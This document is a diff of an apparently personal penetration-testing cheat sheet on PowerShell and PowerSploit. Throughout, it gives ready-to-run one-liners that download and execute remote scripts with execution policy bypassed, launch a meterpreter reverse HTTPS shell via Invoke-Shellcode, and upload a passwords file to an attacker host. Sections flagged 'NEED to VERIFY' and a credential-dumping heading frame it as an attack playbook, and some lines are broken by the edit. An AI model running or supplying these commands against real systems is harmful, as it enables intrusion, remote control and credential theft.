@@ -2,7 +2,7 @@ PowerShell - How To
 
 
 # Download from Kali
-cd /opt/PowerSploit/Recon/
+/opt/CrackMapExec/build/lib/cme/data/powersploit/Recon/
 python -m SimpleHTTPServer
 
 - Windows
@@ -14,8 +14,8 @@ Import-Module .\PowerView.ps1
 # Execute a remote file
 powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:8000/PowerView.ps1');Get-NetLocalGroup"
 
-# Upload a file (POST)
-powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.1.5/evil.ps1',"<PostDATA>")"
+# Upload a file
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.1.5/passwords.txt',"<PostDATA>")"
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # PowerSploit - getting a shell without writing to disk     *** NEED to VERIFY ***
@@ -27,14 +27,12 @@ set lhost 192.168.1.5
 set lport 443
 exploit -j
 
-- Open a new tab
-cd /opt/PowerSploit/CodeExecution/
+- Open a new tab, load from Kali
+/opt/CrackMapExec/build/lib/cme/data/powersploit/CodeExecution/
 python -m SimpleHTTPServer
 
-- Windows
-powershell.exe -nop -exec bypass
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:8000/Invoke-Shellcode.ps1')
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.5 -Lport 443 -Force
+- Windows execute a remote file
+powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:8000/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.5 -Lport 443 -Force"
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Priv escalation     *** NEED to VERIFY ***
@@ -48,10 +46,10 @@ Invoke-AllChecks
 cd /opt/PowerSploit/Privesc/
 python -m SimpleHTTPServer
 
-- Windows
+- Windows execute a remote file
 powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:8000/PowerUp.ps1');Invoke-AllChecks"
 
-powershell -nop -NonI -w hidden -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:8000/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.5 -Lport 443 -Force"
+powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:8000/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.5 -Lport 443 -Force"
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Dump creds     *** NEED to VERIFY ***
